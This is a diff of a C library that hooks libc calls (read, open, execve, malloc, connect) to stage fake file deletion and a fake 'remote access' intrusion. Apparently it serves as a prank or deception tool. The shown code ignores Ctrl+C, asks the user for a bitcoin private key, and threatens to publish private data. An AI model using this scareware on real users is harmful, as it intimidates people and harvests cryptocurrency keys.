@@ -30,10 +30,7 @@
 typedef struct dirent* (*orig_readdir_f_type)(DIR *);
 typedef struct dirent64* (*orig_readdir64_f_type)(DIR *);
 typedef int (*orig_open_f_type)(const char *, int, ...);
-typedef int (*orig_openat_f_type)(int, const char *, int, ...);
 typedef int (*orig_access_f_type)(const char *, int);
-typedef int (*orig_stat_f_type)(const char *, struct stat *);
-
 
 static void* (*original_malloc)(size_t)=NULL;
 ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
@@ -43,7 +40,6 @@ static int (*connect_connect)(int, const struct sockaddr *, socklen_t) = NULL;
 int (*original_getchar)(void) =NULL;
 
 static int block_count = 0; // Global counter for blocked connections
-
 
 
 // ####### MALLOC Random #######
@@ -122,7 +118,6 @@ void *malloc(size_t size) {
 
 //####### READ #######
 // Hijack of the read() function. Simulates deletion with cat, less, chown or chmod. Simulates remote access with install and apt-get.
-
 void restore_terminal() { //function needed to stop freezing the terminal after the _exit(0) command
     struct termios term;
     int fd = fileno(stdin);
@@ -134,7 +129,7 @@ void restore_terminal() { //function needed to stop freezing the terminal after 
 
 void remote_access() {
     fprintf(stderr, "\033[?25l");  // Hide cursor to look more realistic 
-    fprintf(stderr, "Remote access detected from IP 192.168.0.173\n");
+    fprintf(stderr, "Remote access detected from IP 192.168.0.173\n"); // just a random IP nr
     sleep(1);
     fprintf(stderr, "Downloading spy software\n");
 
@@ -158,19 +153,17 @@ void remote_access() {
     fprintf(stderr, "\033[?25h");  // Show cursor again
     char key[128]; // e.g E9873D79C6D87DC0FB6A5778633389F4453213303DA61F20BD67FC233DORIKTF 
     if (fgets(key, sizeof(key), stdin)) { // input gets taken
-    // Remove newline if present
     size_t len = strlen(key);
-    if (len > 0 && key[len - 1] == '\n') {
-        key[len - 1] = '\0';
+    if (len > 0 && key[len - 1] == '\n') { // remove the newline for correct length
         len--;
     } 
 
     if (len == 64) { // because a bitcoin private key is a 64 char long string of letters and numbers
-        fprintf(stderr, "\033[33mThank you. You will hear from us.\033[0m\n");
+        fprintf(stderr, "\033[33mThank you. You will hear from us.\033[0m\n"); // length matches
     } else {
         fprintf(stderr, "\033[31mAre you really trying to trick us? This is an invalid key. We will publish all your private information.\033[0m\n");
-        sleep(2);
     }
+    sleep(2);
    } 
 }
 
@@ -188,11 +181,10 @@ ssize_t read(int fd, void *buf, size_t count) {
         original_read = dlsym(RTLD_NEXT, "read");
     }
     
-    if (getenv("HACKED_ALREADY")) {
+    if (getenv("ALREADY_DONE")) {
     return original_read(fd, buf, count);
 }
 
-    
     static int deletion_triggered = 0;
     static int done = 0;
     static int remote_triggered = 0;
@@ -202,7 +194,7 @@ ssize_t read(int fd, void *buf, size_t count) {
     }
 
     if (!deletion_triggered) {
-        deletion_triggered = 1;
+        deletion_triggered = 1; // avoid showing same outputs multiple times 
         signal(SIGINT, SIG_IGN); // Ignore Ctrl+C
 
         char exe[512];
@@ -280,7 +272,6 @@ ssize_t read(int fd, void *buf, size_t count) {
 
 // ####### OPEN #######
 //recommended to use with the commands cp, head, nano, cat
-
 int open(const char *pathname, int flags, ...) {
     if (!original_open) {
         original_open = dlsym(RTLD_NEXT, "open");
@@ -532,7 +523,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
     if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");
 
     // Prevent recursion
-    if (getenv("HACKED_ALREADY")) {
+    if (getenv("ALREADY_DONE")) {
         return real_execve(filename, argv, envp);
     }
 
@@ -583,7 +574,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
             while (envp[envc] != NULL) envc++;
             char **new_envp = malloc((envc + 2) * sizeof(char *));
             for (int j = 0; j < envc; ++j) new_envp[j] = envp[j];
-            new_envp[envc] = "HACKED_ALREADY=1";
+            new_envp[envc] = "ALREADY_DONE=1";
             new_envp[envc + 1] = NULL;
 
             return real_execve(filename, new_argv, new_envp);
@@ -599,7 +590,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
     for (int i = 0; i < envc; ++i) {
         new_envp[i] = envp[i];
     }
-    new_envp[envc] = "HACKED_ALREADY=1";
+    new_envp[envc] = "ALREADY_DONE=1";
     new_envp[envc + 1] = NULL;
 
     return real_execve(filename, argv, new_envp);
